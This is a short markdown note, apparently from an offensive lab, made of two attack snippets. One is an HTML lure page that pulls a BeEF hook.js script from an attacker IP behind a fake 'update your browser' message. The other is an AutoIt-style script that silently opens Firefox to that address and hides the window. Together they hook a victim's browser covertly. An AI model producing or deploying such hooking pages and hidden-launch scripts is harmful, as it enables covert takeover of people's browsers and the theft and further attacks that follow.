## Malicious Html file to hook beef
```
<html>
  <head>
    <script src="http://10.10.80.2:3000/hook.js"></script>
  <head>
  <body>
    <h1> Please update your browser to access the website </h1>
  </body>
</html>
```
## autoscript to open html file
```
$path = "C:\Program Files (x86)\Firefox Developer Edition\"
$path1 = "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\"
ShellExecute($path & "firefox.exe", "http://10.10.80.2", "","",@SW_HIDE)
WinWait("[TITLE:Firefox Developer Edition]")
WinSetState ("[LAST]","", @SW_HIDE)
```
